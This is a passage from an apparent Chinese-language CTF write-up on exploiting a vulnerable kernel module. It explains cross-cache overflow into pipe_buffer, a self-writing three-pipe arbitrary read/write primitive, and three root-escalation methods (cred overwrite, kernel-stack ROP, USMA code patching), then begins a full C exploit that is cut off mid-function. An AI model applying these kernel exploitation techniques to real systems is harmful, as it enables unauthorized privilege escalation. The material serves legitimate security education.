<span class=w>    </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pipe_resize_ring</span><span class=p>(</span><span class=n>pipe</span><span class=p>,</span><span class=w> </span><span class=n>nr_slots</span><span class=p>);</span>

<span class=c1>//...</span>

<span class=kt>int</span><span class=w> </span><span class=n>pipe_resize_ring</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=n>pipe</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>nr_slots</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=n>bufs</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>head</span><span class=p>,</span><span class=w> </span><span class=n>tail</span><span class=p>,</span><span class=w> </span><span class=n>mask</span><span class=p>,</span><span class=w> </span><span class=n>n</span><span class=p>;</span>

<span class=w>    </span><span class=n>bufs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>kcalloc</span><span class=p>(</span><span class=n>nr_slots</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=o>*</span><span class=n>bufs</span><span class=p>),</span>
<span class=w>               </span><span class=n>GFP_KERNEL_ACCOUNT</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>__GFP_NOWARN</span><span class=p>);</span>
</code></pre></div> <p>那么我们不难想到的是<strong>我们可以通过 fcntl() 重新分配单个 pipe 的 pipe_buffer 数量，</strong>：</p> <ul> <li>对于每个 pipe 我们<strong>指定分配 64 个 pipe_buffer，从而使其向 kmalloc-cg-2k 请求对象，而这将最终向 buddy system 请求 order-3 的页面</strong></li> </ul> <p>由此，我们便成功使得 <code>pipe_buffer</code> 与题目模块的对象<strong>处在同一 order 的内存页上</strong>，从而提高 cross-cache overflow 的成功率。</p> <p>不过需要注意的是，由于 page 结构体的大小为 0x40，其可以被 0x100 整除，因此若我们所溢出的目标 page 的地址最后一个字节刚好为 <code>\x00</code>， <em>那就等效于没有溢出</em> ，因此实际上利用成功率仅为 <code>75%</code> 。</p> <h4 id=stepiii->Step.III - 构造二级自写管道，实现任意内存读写<a class=headerlink href=#stepiii- title="Permanent link">&para;</a></h4> <p>有了 page-level UAF，我们接下来考虑向这张页面分配什么结构体作为下一阶段的 victim object。</p> <p>由于管道本身便提供给我们读写的功能，而我们又能够调整 <code>pipe_buffer</code> 的大小并重新分配结构体，那么再次选择 <code>pipe_buffer</code> 作为 victim object 便是再自然不过的事情：</p> <p><img alt src=../figure/pipe-page-uaf.png></p> <p>接下来我们可以通过 UAF 管道<strong>读取 pipe_buffer 内容，从而泄露出 page、pipe_buf_operations 等有用的数据</strong>（可以在重分配前预先向管道中写入一定长度的内容，从而实现数据读取），由于我们可以通过 UAF 管道直接改写 <code>pipe_buffer</code> ，因此将漏洞转化为 dirty pipe 或许会是一个不错的办法（这也是本次比赛中 NU1L 战队的解法）</p> <p>但是 pipe 的强大之处远不止这些，由于我们可以对 UAF 页面上的 <code>pipe_buffer</code> 进行读写，我们可以<strong>继续构造出第二级的 page-level UAF</strong>：</p> <p><img alt src=../figure/pipe-page-uaf-next.png></p> <p>为什么要这么做呢？在第一次 UAF 时我们获取到了 page 结构体的地址，而 page 结构体的大小固定为 0x40，<strong>且与物理内存页一一对应</strong>，试想若是我们可以不断地修改一个 pipe 的 page 指针，<strong>则我们便能完成对整个内存空间的任意读写</strong>，因此接下来我们要完成这样的一个利用系统的构造。</p> <p>再次重新分配 <code>pipe_buffer</code> 结构体到第二级 page-level UAF 页面上，<strong>由于这张物理页面对应的 page 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 pipe_buffer 的 page 指针指向自身，从而直接完成对自身的修改</strong>：</p> <p><img alt src=../figure/self-pointing-pipe.png></p> <p>这里我们可以篡改 <code>pipe_buffer.offset</code> 与 <code>pipe_buffer.len</code> 来移动 pipe 的读写起始位置，从而实现无限循环的读写，但是这两个变量会在完成读写操作后重新被赋值，因此这里我们使用<strong>三个管道</strong>：</p> <ul> <li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成 ：）</li> <li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li> <li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置、第二个管道的写入起始位置指向第三个管道</li> </ul> <p>通过这三个管道之间互相循环修改，我们便<strong>实现了一个可以在内存空间中进行近乎无限制的任意读写系统</strong>。</p> <h4 id=stepiv->Step.IV - 提权<a class=headerlink href=#stepiv- title="Permanent link">&para;</a></h4> <p>有了内存空间中的任意读写，提权便是非常简便的一件事情了，这里笔者给出三种提权方法。</p> <h5 id=task_struct-cred-init_cred>方法一、修改当前进程的 task_struct 的 cred 为 init_cred<a class=headerlink href=#task_struct-cred-init_cred title="Permanent link">&para;</a></h5> <p><code>init_cred</code> 为有着 root 权限的 cred，我们可以直接将当前进程的 cred 修改为该 cred 以完成提权，这里iwom可以通过 <code>prctl(PR_SET_NAME, "arttnba3pwnn");</code> 修改 <code>task_struct.comm</code> ，从而方便搜索当前进程的 <code>task_struct</code> 在内存空间中的位置。</p> <p>不过 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的，我们在调试时未必能够获得其地址，因此这里笔者选择通过解析 <code>task_struct</code> 的方式向上一直找到 <code>init</code> 进程（所有进程的父进程）的 <code>task_struct</code> ，从而获得 <code>init_cred</code> 的地址。</p> <p>此外，我们也可以选择直接修改当前进程的 <code>task_struct::cred</code> 的几个 uid 字段，这里便不再赘述。</p> <h5 id=rop>方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP<a class=headerlink href=#rop title="Permanent link">&para;</a></h5> <p><strong>开启了 CFI 并不代表我们便不能够在内核空间中进行任意代码执行了</strong>。由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong>。</p> <p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情。</p> <p>需要注意的是内核栈是使用 vmalloc 分配的一个内存段，因此 <strong>内核栈对应的四张内存页不一定是物理连续的</strong> ，如果我们以解析第一张内存页对应的物理地址的结果来计算栈底页的物理地址，<strong>则有相当大的概率没法直接写到当前进程的内核栈上</strong> （也不知道写哪去了），从而导致 ROP 失败。</p> <p>因此我们需要解析栈底内存页的虚拟地址对应的物理地址，而非直接解析从 <code>task_struct</code> 中拿到的栈顶虚拟地址对应的物理地址后再计算栈底的物理地址。</p> <h5 id=usma>方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA<a class=headerlink href=#usma title="Permanent link">&para;</a></h5> <p>既然我们能够进行内存空间中的任意读写，<strong>直接改写内核代码段也是一个实现任意代码执行的好办法</strong>，但是直接映射区对应的内核代码段区域<strong>没有可写入权限，直接写会导致 kernel panic。</strong></p> <p>但是改写内核代码段本质上便是向对应的物理页写入数据，而我们又能够读写进程页表，<strong>我们直接在用户空间建立一个到内核代码段对应物理内存的映射就能改写内核代码段了。</strong> 这里我们选择改写 <code>setresuid()</code> 函数当中用来进行权限检查的 <code>ns_capable_setid()</code> 函数，直接 patch 掉权限检查的部分即可直接通过 <code>setresuid()</code> 函数将当前进程的 uid 直接改为 root。</p> <p>方便起见，我们可以先通过 <code>mmap()</code> 随便映射一块内存，之后改写 <code>mmap()</code> 的虚拟地址在页表中对应的物理地址即可，这种方法本质上其实就是 <a href=https://vul.360.net/archives/391>用户态映射攻击</a>。</p> <h4 id=final-exploitation>Final Exploitation<a class=headerlink href=#final-exploitation title="Permanent link">&para;</a></h4> <p>最终的完整 exp 如下，<strong>同时包含笔者所给出的三种提权手段的代码</strong>：</p> <div class=highlight><pre><span></span><code><span class=cm>/**</span>
<span class=cm> * Copyright (c) 2023 arttnba3 &lt;arttnba@gmail.com&gt;</span>
<span class=cm> * </span>
<span class=cm> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span>
<span class=cm>**/</span>

<span class=cp>#define _GNU_SOURCE</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdlib.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;unistd.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;fcntl.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;string.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;sched.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;sys/prctl.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;sys/ioctl.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;sys/socket.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;sys/mman.h&gt;</span>

<span class=cm>/**</span>
<span class=cm> * I - fundamental infrastructures</span>
<span class=cm> * e.g. CPU-core binder, user-status saver, etc.</span>
<span class=cm>**/</span>

<span class=cp>#define SUCCESS_MSG(msg)    &quot;\033[32m\033[1m&quot; msg &quot;\033[0m&quot;</span>
<span class=cp>#define INFO_MSG(msg)       &quot;\033[34m\033[1m&quot; msg &quot;\033[0m&quot;</span>
<span class=cp>#define ERROR_MSG(msg)      &quot;\033[31m\033[1m&quot; msg &quot;\033[0m&quot;</span>

<span class=cp>#define log_success(msg)    puts(SUCCESS_MSG(msg))</span>
<span class=cp>#define log_info(msg)       puts(INFO_MSG(msg))</span>
<span class=cp>#define log_error(msg)      puts(ERROR_MSG(msg))</span>

<span class=cp>#ifndef PAGE_SIZE</span>
<span class=w>    </span><span class=cp>#define PAGE_SIZE 0x1000</span>
<span class=cp>#endif</span>

<span class=cp>#ifndef PAGE_MASK</span>
<span class=w>    </span><span class=cp>#define PAGE_MASK (~(PAGE_SIZE - 1))</span>
<span class=cp>#endif</span>

<span class=cp>#define KERNEL_BASE 0xffffffff81000000</span>
<span class=cp>#define KERNEL_DIRECT_PHYSMEM_MAP_BASE 0xffff888000000000</span>
<span class=cp>#define KERNEL_VMEMMAP_BASE 0xffffea0000000000</span>
<span class=cp>#define KASLR_GRANULARITY 0x10000000</span>
<span class=cp>#define KASLR_MASK (~(KASLR_GRANULARITY - 1))</span>

<span class=kt>size_t</span><span class=w> </span><span class=n>kernel_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>KERNEL_BASE</span><span class=p>,</span><span class=w> </span><span class=n>kernel_offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=kt>size_t</span><span class=w> </span><span class=n>page_offset_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>KERNEL_DIRECT_PHYSMEM_MAP_BASE</span><span class=p>;</span>
<span class=kt>size_t</span><span class=w> </span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>KERNEL_VMEMMAP_BASE</span><span class=p>;</span>
<span class=kt>size_t</span><span class=w> </span><span class=n>init_task</span><span class=p>,</span><span class=w> </span><span class=n>init_nsproxy</span><span class=p>,</span><span class=w> </span><span class=n>init_cred</span><span class=p>;</span>

<span class=kt>size_t</span><span class=w> </span><span class=nf>direct_map_addr_to_page_addr</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>direct_map_addr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>page_count</span><span class=p>;</span>

<span class=w>    </span><span class=n>page_count</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>direct_map_addr</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>))</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>page_offset_base</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=mh>0x1000</span><span class=p>;</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>page_count</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mh>0x40</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>err_exit</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>msg</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>ERROR_MSG</span><span class=p>(</span><span class=s>&quot;[x] Error at: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%s</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>msg</span><span class=p>);</span>
<span class=w>    </span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
<span class=w>    </span><span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/* root checker and shell poper */</span>
<span class=kt>void</span><span class=w> </span><span class=nf>get_root_shell</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>setresuid</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
<span class=w>    </span><span class=n>setresgid</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>

<span class=w>    </span><span class=k>if</span><span class=p>(</span><span class=n>getuid</span><span class=p>())</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>log_error</span><span class=p>(</span><span class=s>&quot;[x] Failed to get the root!&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
<span class=w>        </span><span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>log_success</span><span class=p>(</span><span class=s>&quot;[+] Successful to get the root.&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Execve root shell now...&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>system</span><span class=p>(</span><span class=s>&quot;su root -c sh&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* to exit the process normally, instead of potential segmentation fault */</span>
<span class=w>    </span><span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/* userspace status saver */</span>
<span class=kt>size_t</span><span class=w> </span><span class=n>user_cs</span><span class=p>,</span><span class=w> </span><span class=n>user_ss</span><span class=p>,</span><span class=w> </span><span class=n>user_rflags</span><span class=p>,</span><span class=w> </span><span class=n>user_sp</span><span class=p>;</span>
<span class=kt>void</span><span class=w> </span><span class=nf>save_status</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>asm</span><span class=w> </span><span class=k>volatile</span><span class=p>(</span>
<span class=w>        </span><span class=s>&quot;mov user_cs, cs;&quot;</span>
<span class=w>        </span><span class=s>&quot;mov user_ss, ss;&quot;</span>
<span class=w>        </span><span class=s>&quot;mov user_sp, rsp;&quot;</span>
<span class=w>        </span><span class=s>&quot;pushf;&quot;</span>
<span class=w>        </span><span class=s>&quot;pop user_rflags;&quot;</span>
<span class=w>    </span><span class=p>);</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Status has been saved.&quot;</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/* bind the process to specific core */</span>
<span class=kt>void</span><span class=w> </span><span class=nf>bind_core</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>core</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>cpu_set_t</span><span class=w> </span><span class=n>cpu_set</span><span class=p>;</span>

<span class=w>    </span><span class=n>CPU_ZERO</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cpu_set</span><span class=p>);</span>
<span class=w>    </span><span class=n>CPU_SET</span><span class=p>(</span><span class=n>core</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>cpu_set</span><span class=p>);</span>
<span class=w>    </span><span class=n>sched_setaffinity</span><span class=p>(</span><span class=n>getpid</span><span class=p>(),</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>cpu_set</span><span class=p>),</span><span class=w> </span><span class=o>&amp;</span><span class=n>cpu_set</span><span class=p>);</span>

<span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[*] Process binded to core &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>core</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * @brief create an isolate namespace</span>
<span class=cm> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span>
<span class=cm> * to perform basic exploiting operations in it only</span>
<span class=cm>**/</span>
<span class=kt>void</span><span class=w> </span><span class=nf>unshare_setup</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>edit</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>tmp_fd</span><span class=p>;</span>

<span class=w>    </span><span class=n>unshare</span><span class=p>(</span><span class=n>CLONE_NEWNS</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>CLONE_NEWUSER</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>CLONE_NEWNET</span><span class=p>);</span>

<span class=w>    </span><span class=n>tmp_fd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>open</span><span class=p>(</span><span class=s>&quot;/proc/self/setgroups&quot;</span><span class=p>,</span><span class=w> </span><span class=n>O_WRONLY</span><span class=p>);</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>tmp_fd</span><span class=p>,</span><span class=w> </span><span class=s>&quot;deny&quot;</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=s>&quot;deny&quot;</span><span class=p>));</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>tmp_fd</span><span class=p>);</span>

<span class=w>    </span><span class=n>tmp_fd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>open</span><span class=p>(</span><span class=s>&quot;/proc/self/uid_map&quot;</span><span class=p>,</span><span class=w> </span><span class=n>O_WRONLY</span><span class=p>);</span>
<span class=w>    </span><span class=n>snprintf</span><span class=p>(</span><span class=n>edit</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>edit</span><span class=p>),</span><span class=w> </span><span class=s>&quot;0 %d 1&quot;</span><span class=p>,</span><span class=w> </span><span class=n>getuid</span><span class=p>());</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>tmp_fd</span><span class=p>,</span><span class=w> </span><span class=n>edit</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>edit</span><span class=p>));</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>tmp_fd</span><span class=p>);</span>

<span class=w>    </span><span class=n>tmp_fd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>open</span><span class=p>(</span><span class=s>&quot;/proc/self/gid_map&quot;</span><span class=p>,</span><span class=w> </span><span class=n>O_WRONLY</span><span class=p>);</span>
<span class=w>    </span><span class=n>snprintf</span><span class=p>(</span><span class=n>edit</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>edit</span><span class=p>),</span><span class=w> </span><span class=s>&quot;0 %d 1&quot;</span><span class=p>,</span><span class=w> </span><span class=n>getgid</span><span class=p>());</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>tmp_fd</span><span class=p>,</span><span class=w> </span><span class=n>edit</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>edit</span><span class=p>));</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>tmp_fd</span><span class=p>);</span>
<span class=p>}</span>

<span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=p>;</span>
<span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=p>;</span>
<span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=p>;</span>

<span class=cm>/* read start from len to offset, write start from offset */</span>
<span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=w> </span><span class=o>*</span><span class=n>page</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>len</span><span class=p>;</span>
<span class=w>    </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=w> </span><span class=o>*</span><span class=n>ops</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>flags</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>private</span><span class=p>;</span>
<span class=p>};</span>

<span class=k>struct</span><span class=w> </span><span class=nc>pipe_buf_operations</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=p>(</span><span class=o>*</span><span class=n>confirm</span><span class=p>)(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=p>,</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=p>);</span>
<span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=p>(</span><span class=o>*</span><span class=n>release</span><span class=p>)(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=p>,</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=p>);</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=p>(</span><span class=o>*</span><span class=n>try_steal</span><span class=p>)(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=p>,</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=p>);</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=p>(</span><span class=o>*</span><span class=n>get</span><span class=p>)(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=p>,</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=o>*</span><span class=p>);</span>
<span class=p>};</span>

<span class=cm>/**</span>
<span class=cm> * II - interface to interact with /dev/kcache</span>
<span class=cm>**/</span>

<span class=cp>#define KCACHE_SIZE 2048</span>
<span class=cp>#define KCACHE_NUM 0x10</span>

<span class=cp>#define KCACHE_ALLOC 0x114</span>
<span class=cp>#define KCACHE_APPEND 0x514</span>
<span class=cp>#define KCACHE_READ 0x1919</span>
<span class=cp>#define KCACHE_FREE 0x810</span>

<span class=k>struct</span><span class=w> </span><span class=nc>kcache_cmd</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>idx</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>sz</span><span class=p>;</span>
<span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>buf</span><span class=p>;</span>
<span class=p>};</span>

<span class=kt>int</span><span class=w> </span><span class=n>dev_fd</span><span class=p>;</span>

<span class=kt>int</span><span class=w> </span><span class=nf>kcache_alloc</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>buf</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>kcache_cmd</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=p>.</span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>index</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>sz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buf</span><span class=p>,</span>
<span class=w>    </span><span class=p>};</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span><span class=w> </span><span class=n>KCACHE_ALLOC</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>cmd</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span><span class=w> </span><span class=nf>kcache_append</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>buf</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>kcache_cmd</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=p>.</span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>index</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>sz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buf</span><span class=p>,</span>
<span class=w>    </span><span class=p>};</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span><span class=w> </span><span class=n>KCACHE_APPEND</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>cmd</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span><span class=w> </span><span class=nf>kcache_read</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>buf</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>kcache_cmd</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=p>.</span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>index</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>sz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buf</span><span class=p>,</span>
<span class=w>    </span><span class=p>};</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span><span class=w> </span><span class=n>KCACHE_READ</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>cmd</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span><span class=w> </span><span class=nf>kcache_free</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>kcache_cmd</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
